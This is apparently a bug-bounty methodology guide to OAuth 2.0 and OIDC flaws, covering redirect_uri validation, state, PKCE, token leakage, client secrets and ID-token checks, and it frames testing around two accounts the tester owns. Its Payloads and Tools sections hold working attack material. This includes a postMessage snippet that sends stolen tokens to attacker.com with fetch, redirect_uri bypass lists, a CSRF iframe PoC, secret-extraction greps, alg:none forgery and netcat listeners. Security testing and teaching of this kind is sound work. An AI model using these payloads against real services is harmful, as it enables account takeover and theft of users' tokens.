# OAuth 2.0 & OIDC Vulnerabilities
> One-line summary: misvalidated `redirect_uri`, missing `state`, and leaked codes/tokens turn the app's own SSO login into account takeover — consistently the highest-value bug class on programs with social login.

## Overview
OAuth 2.0 lets an app (client) get access to a user's data or identity at a provider (Google, Facebook, or a homegrown IdP) without the user handing the app their provider password. The flow that matters in bug bounty is the authorization code grant: the browser hits `/authorize` with `client_id`, `redirect_uri`, `scope`, `state`, and (with PKCE) `code_challenge`; the provider authenticates the user and 302s back to `redirect_uri` carrying a one-time `code`; the app's backend exchanges the `code` at `/token` for tokens and logs the user in. Flaws live at every seam of this exchange: `redirect_uri` validation that accepts anything the URL parser swallows (code theft), missing or predictable `state` (login CSRF, forced account linking), client secrets baked into SPAs/mobile apps, sloppy token handling (Referer leaks, tokens in browser history, `postMessage` with a wildcard origin), and — for OIDC — ID tokens that are never properly verified (`iss`, `aud`, signature). Payoff is almost always account takeover: steal the victim's code/token and you are the victim, or force the victim's social identity onto your account.

## Where to find it
- `/authorize`, `/token`, `/oauth/callback`, `/login/oauth/authorize`, `/api/auth/oauth/*` — the three endpoints every OAuth client exposes
- `redirect_uri` parameter: the single most-lucrative input in the flow
- Legacy implicit flow (`response_type=token`) endpoints on old APIs or mobile backends
- Social login buttons ("Continue with Google/Facebook/Apple") on every login page
- Account linking/connect flows ("Link your Facebook account") — CSRF and pre-account-takeover territory
- Mobile apps: client secrets in the APK, custom-scheme deeplink callbacks (`myapp://callback`) another installed app can register
- SPAs doing the token exchange client-side (secret in the JS bundle, code in browser history)
- Third-party integrations and webhooks that authorize via OAuth (Slack/Teams/GitHub connectors)
- Callback pages that reflect the URL (XSS on the callback = token theft), load third-party resources (Referer leak), or `postMessage` their URL to a parent frame
- OIDC providers: `/.well-known/openid-configuration` discloses every endpoint, algorithm, and `iss` value to test against

## Methodology
1. **Map the flow.** Start a login with Burp recording and capture every hop: the `/authorize` request (note `client_id`, `response_type`, `scope`, `state`, `code_challenge`/`code_challenge_method`, `response_mode`, `prompt`), the 302 back to `redirect_uri` with `?code=`, and the `/token` exchange. Identify the provider (custom, Auth0, Okta, Cognito, Keycloak, Google) and the grant type. Record the exact parameter order — many validators match on substrings or parse naively, and every bypass in step 2 depends on how this specific server parses.
2. **Test `redirect_uri` validation.** Swap `redirect_uri` for `https://attacker.com` and watch where the 302 after authentication goes. Work through the variants in Payloads: exact-match quirks, trailing characters, path traversal, `@` userinfo, subdomain tricks, param pollution (send `redirect_uri` twice — first wins vs last wins), and open-redirect chaining. **Confirmation rule: the server's "accepted" is irrelevant — you must observe the `code` delivered to your server** (302 `Location` containing `attacker.com` with `?code=` or `#access_token=`). Some servers accept any value at `/authorize` and only fail later, or validate against the value in `/token` instead.
3. **Test `state`.** Request the flow twice and compare `state` values (random per request?). Remove `state` from `/authorize` entirely, then reuse a captured `state` with a new code. If the callback completes login either way, `state` is not enforced → CSRF. **Confirm** with two browsers/accounts: attacker initiates the flow, captures the callback URL, delivers it to the victim's browser; if the victim ends up in the attacker's account (login CSRF) or the attacker's account ends up bound to the victim's provider identity (linking CSRF), it's real — an iframe/auto-submit PoC must actually complete in a fresh victim browser, not your own session.
4. **Test PKCE.** If `code_challenge` is present, strip it from `/authorize`; then at `/token` drop `code_verifier`, send a wrong verifier, or downgrade `code_challenge_method=S256` to `plain` (and recompute the challenge as the plaintext verifier). **Confirm:** `/token` returns HTTP 200 with `access_token` despite the missing/wrong verifier. If PKCE is only checked when `code_challenge` is present, stripping it entirely downgrades the flow to the pre-PKCE, code-injection-vulnerable state.
5. **Test token/code handling.** Replay the same `code` at `/token` twice (200 both times = no one-time enforcement). Check whether the `code` or `access_token` appears in the URL query of any redirect (browser history, proxy logs) vs the fragment. On the callback page, look for third-party resources (`<script src=...>`, images, beacons) that receive the code in their `Referer`. If the callback is framed, check for `postMessage` sending `location.href`/`location.hash` to `*`. **Confirm** each by standing up a real receiving page/listener and showing the value arriving in its logs.
6. **Test client secrets.** If the `/token` call happens in the SPA or app, the secret is in the JS bundle or APK (`grep` for `client_secret`, or intercept the exchange and read it). With the secret, replay the exchange with your own `redirect_uri`/`code` to confirm it identifies the client. Then test what the secret + `client_id` can do directly against the provider's API (scope upgrade: append `admin` or `openid profile email`).
7. **OIDC checks.** Fetch `/.well-known/openid-configuration` and list `jwks_uri`, `issuer`, and algorithms. Take the ID token from the callback and run it through `jwt_tool`: decode for `aud` (must equal `client_id`), `iss`, `nonce`, `email_verified`; try `alg:none`, HS256 signed with the provider's RSA public key (from `jwks_uri`), `kid` manipulation, and submitting the token to the app with the `iss` swapped to another provider the app trusts. **Confirm:** the app accepts your forged/modified ID token and issues its own session for the spoofed identity.
8. **Prove with two accounts.** Run every confirmed finding end-to-end with Account A (attacker, yours) and Account B (victim, yours): B's code/token/identity ends up under A's control without B performing the binding action. Screenshot each hop and record timestamps — authorization codes expire in seconds, so capture them while they're live.

## Payloads
Map and capture the flow:
```bash
# Authorize — already logged in at the IdP so the code is issued immediately:
curl -si "https://auth.target.com/oauth/authorize?client_id=abc123&response_type=code&redirect_uri=https%3A%2F%2Ftarget.com%2Foauth%2Fcallback&scope=openid%20profile%20email&state=8f3c9d&code_challenge=eF4...&code_challenge_method=S256" \
  -H "Cookie: session=<IDP_SESSION>" | grep -i '^location'
# -> Location: https://target.com/oauth/callback?code=CODE_VALUE&state=8f3c9d

# Token exchange:
curl -si -X POST https://auth.target.com/oauth/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code&code=CODE_VALUE&redirect_uri=https%3A%2F%2Ftarget.com%2Foauth%2Fcallback&client_id=abc123&client_secret=SECRET&code_verifier=VERIFIER"
```

`redirect_uri` fuzz — only a 302 to attacker.com with the code counts as a hit:
```bash
cat > ruri.txt <<'EOF'
https://attacker.com
https://attacker.com/
https://target.com.attacker.com
https://attacker.com/?https://target.com
https://attacker.com%23.target.com
https://target.com%40attacker.com
https://attacker.com%3f.target.com
https://target.com/oauth/callback/../../../attacker.com
https://target.com/oauth/callback/..%2f..%2f..%2fattacker.com
https://target.com/oauth/callback/..%5c..%5cattacker.com
https://attacker.com/https://target.com
https://target.com/oauth/callback?next=https://attacker.com
https://attacker.com%2f%2ftarget.com
EOF
while read -r ru; do
  enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$ru")
  loc=$(curl -si "https://auth.target.com/oauth/authorize?client_id=abc123&response_type=code&redirect_uri=$enc&state=x&scope=openid" \
    -H "Cookie: session=<IDP_SESSION>" | grep -i '^location' | cut -d' ' -f2)
  echo "$ru => $loc"
done < ruri.txt
```
Also test param pollution: send `redirect_uri` twice (valid first, attacker second, and vice versa) and watch which one the 302 uses.

CSRF account-linking PoC (missing/fixed `state`). Attacker completes the flow to get `ATTACKER_CODE`, then serves this to the victim:
```html
<!-- attacker.com/link.html — victim's browser completes the callback,
     binding the victim's provider identity to the attacker's session -->
<iframe src="https://target.com/oauth/callback?code=ATTACKER_CODE&state=ATTACKER_STATE"></iframe>
<!-- Login-CSRF variant: victim ends up logged into the attacker's account;
     whatever the victim enters (CC, messages, PII) lands in attacker's account -->
```

PKCE strip:
```bash
# /authorize with NO code_challenge (everything else identical):
curl -si "https://auth.target.com/oauth/authorize?client_id=abc123&response_type=code&redirect_uri=https%3A%2F%2Ftarget.com%2Foauth%2Fcallback&scope=openid&state=x" \
  -H "Cookie: session=<IDP_SESSION>" | grep -i '^location'

# /token with no code_verifier — 200 + access_token means PKCE is not enforced:
curl -si -X POST https://auth.target.com/oauth/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code&code=CODE_VALUE&redirect_uri=https%3A%2F%2Ftarget.com%2Foauth%2Fcallback&client_id=abc123"

# S256 -> plain downgrade: recompute challenge as the raw verifier and resubmit
```

Token theft via open redirect on the whitelisted domain — `redirect_uri` exact-match, but the callback page redirects:
```bash
# https://target.com/oauth/callback?next=https://attacker.com/ is an open redirect
# victim clicks the authorize URL, code lands on your listener:
curl -si "https://auth.target.com/oauth/authorize?client_id=abc123&response_type=code&redirect_uri=https%3A%2F%2Ftarget.com%2Foauth%2Fcallback%3Fnext%3Dhttps%3A%2F%2Fattacker.com%2F&state=x" \
  -H "Cookie: session=<VICTIM_IDP_SESSION>"
# listener side: nc -lvnp 8000  then check the access log for  ?code=  or  #access_token=
```

`postMessage` listener for a callback page that broadcasts its URL to `*`:
```html
<script>
window.addEventListener('message', function(e){
  fetch('https://attacker.com/steal?d=' + encodeURIComponent(e.data));
}, false);
</script>
<iframe src="https://target.com/oauth/authorize?client_id=abc123&response_type=token&redirect_uri=https://target.com/oauth/callback&state=x"></iframe>
```

Client secret extraction:
```bash
# JS bundle:
curl -s https://target.com/static/app.js | grep -Eo "(client_secret|clientSecret)[\"']?\s*[:=]\s*[\"'][^\"']{10,}"
# APK:
unzip -p app.apk classes*.dex | strings | grep -iE "client_secret|clientSecret"
# then replay their own exchange with your redirect_uri to confirm the secret is the client's only credential
```

OIDC ID token analysis:
```bash
python3 jwt_tool.py ID_TOKEN                                    # decode claims: aud, iss, nonce, email_verified
python3 jwt_tool.py ID_TOKEN -X n -p "nonce"                    # alg:none, keep payload
curl -s https://auth.target.com/.well-known/openid-configuration | python3 -m json.tool   # jwks_uri, issuer, algs
curl -s https://auth.target.com/oauth/jwks | python3 -m json.tool > jwks.json
python3 jwt_tool.py ID_TOKEN -X k -pk pubkey.pem                # HS256 signed with provider's RSA public key
```

## Bypasses & edge cases
- **Exact-match with parser quirks:** validators that compare the raw string before the URL parser runs — trailing `/`, `%2f`, `//`, backslash `\` treated as `/` (browser-dependent), double-encoding `%252f`, tabs/newlines, null bytes.
- **`@` userinfo trick:** `https://target.com@attacker.com` — string starts with the whitelist entry; whatever the browser actually resolves is what receives the code.
- **Subdomain wildcard registrations:** whitelist of `*.target.com` + any subdomain takeover, or a subdomain with an open redirect (blog, wiki, status page), or a wildcard DNS + XSS.
- **Open redirect chaining:** `redirect_uri` is strict, but the callback page redirects to `?next=`/`?returnTo=` values without validation — the redirect inside the trusted origin carries the code to you.
- **Param pollution:** two `redirect_uri` params — validator reads the first, the redirect handler uses the last (or vice versa). Also `redirect_uri[]=`.
- **`response_type` confusion:** swap `response_type=code` for `response_type=token` (implicit) — some servers issue a token in the fragment with weaker validation; or add `response_type=code%20token` for a hybrid.
- **`response_mode` confusion:** `query` (code in URL/history/Referer) vs `fragment` vs `form_post` — force `query` to widen leak channels.
- **`client_id` swapping:** code issued for app A submitted to `/token` as app B, or app B's callback accepting codes minted for a different client.
- **`scope` upgrade:** append `scope=admin` or extra scopes to `/authorize` — some providers silently grant whatever is asked.
- **`prompt=none`:** silent-auth for already-logged-in users — removes the consent click a victim would need to notice.
- **State-less or fixed-state flows:** `state` hardcoded, per-user (predictable), or validated only against itself — enables login CSRF and linking CSRF.
- **Account linking edge cases:** linking a provider identity that already belongs to a local account (do they merge? attacker links his provider account to victim's local account = ATO); provider emails not verified (`email_verified=false` still trusted = pre-account-takeover); provider accounts you can create with the victim's email address.
- **Mobile deeplink interception:** callback is `myapp://callback` — register the same custom scheme in a malicious app, or use a browser fallback link that the OS mishandles.
- **Cognito quirks:** token endpoint per-userpool, `client_id` only (no secret) for public clients, and user attributes overwritable via the API when tokens are leaked.

## Tools
- **Burp Suite:** capture the whole flow (Proxy history filters: `authorize`, `token`, `oauth`), then Repeater for redirect_uri/state/PKCE mutations and the token exchange. The PortSwigger labs (see References) are the fastest way to drill each technique.
- **jwt_tool** for every OIDC check:
```bash
pip3 install jwt_tool
python3 jwt_tool.py ID_TOKEN -X n -p "sub=admin"
python3 jwt_tool.py ID_TOKEN -C -d /usr/share/wordlists/rockyou.txt
```
- **ffuf** for fuzzing callback paths when the validator allows subpaths of a whitelisted origin:
```bash
ffuf -u "https://auth.target.com/oauth/authorize?client_id=abc123&response_type=code&redirect_uri=https://target.com/FUZZ&state=x" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt -H "Cookie: session=<IDP_SESSION>" \
  -fr "invalid_request|redirect_uri_mismatch"
```
- **PKCE helper** for generating valid verifier/challenge pairs when testing legitimate flows:
```bash
python3 -c "import os,base64,hashlib;v=base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode();print('verifier:',v);print('challenge:',base64.urlsafe_b64encode(hashlib.sha256(v.encode()).digest()).rstrip(b'=').decode())"
```
- **Listener:** `python3 -m http.server 8000` or `ncat -lvnp 8000` on attacker.com to prove code/token delivery.

## Escalation & chaining
- `redirect_uri` bypass + open redirect → victim clicks, code delivered to attacker → attacker exchanges it → full ATO (the classic paid chain, e.g. TikTok careers ATO via open redirect + Referer leak).
- Missing `state` → login CSRF: victim silently logged into attacker's account → victim's entered data (payment methods, private messages) lands in attacker's account; or linking CSRF: attacker's provider identity attached to victim's local account → ATO.
- Callback page XSS (redirect/`error` param reflected) → token/code exfiltrated in the same origin → session hijack without any redirect_uri flaw.
- `postMessage` to `*` on the callback + implicit flow → token broadcast to any parent frame → iframe-based token theft.
- Leaked `client_secret` + scope upgrade → direct provider API access on behalf of the app, bypassing the app's own authorization entirely.
- OIDC ID token confusion (`alg:none`, HS256 with public key, `iss`/`aud` not checked) → forge `sub=admin` or any victim identity → admin access or ATO.
- Pre-account-takeover: provider email unverified → register victim's email at the provider → sign in via OAuth → own the not-yet-created account.

## Report notes
- Two-account PoC: Account A (attacker) and Account B (victim), both owned by you, with a step-by-step sequence a triager can replay in 2 minutes.
- The winning screenshot is the attacker server's access log showing `?code=` (or `#access_token=`) arriving — raw `/authorize` and `/token` request/response pairs for every step, with timestamps (codes expire in seconds; a report with a dead code is a dead report).
- State the precondition exactly: no victim interaction (full ATO) vs one click on a link (high) vs victim already authenticated at the IdP (silent) — this decides severity.
- For CSRF findings, show the PoC completing in a fresh victim browser profile (not your own session) and describe what the victim experiences.
- Identify the flawed party: provider misvalidation vs client misimplementation — programs pay either way, but the fix location and CVSS differ.
- Redact and rotate all tokens after submission; note that tokens must be revoked as part of the fix.

## References
- [PortSwigger Academy: OAuth](https://portswigger.net/web-security/oauth)
- [OAuth 2.0 spec](https://oauth.net/2/)
- [OpenID Connect Core 1.0](https://openid.net/specs/openid-connect-core-1_0.html)
- [OWASP OAuth 2.0 Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet)
- [HackTricks: OAuth to Account Takeover](https://book.hacktricks.wiki/en/pentesting-web/oauth-to-account-takeover.html)
- [Lauritz Holtmann: TikTok Careers Portal ATO (OAuth + open redirect)](https://security.lauritz-holtmann.de/advisories/tiktok-account-takeover/)
- [ysamm: Facebook/Oculus ATO via first-party access_token stealing ($44k)](https://ysamm.com/uncategorized/2023/01/29/account-takeover-of-facebook-oculus-accounts-due-to-first-party-access_token-stealing.html)
- [Doyensec: Common OAuth Vulnerabilities](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
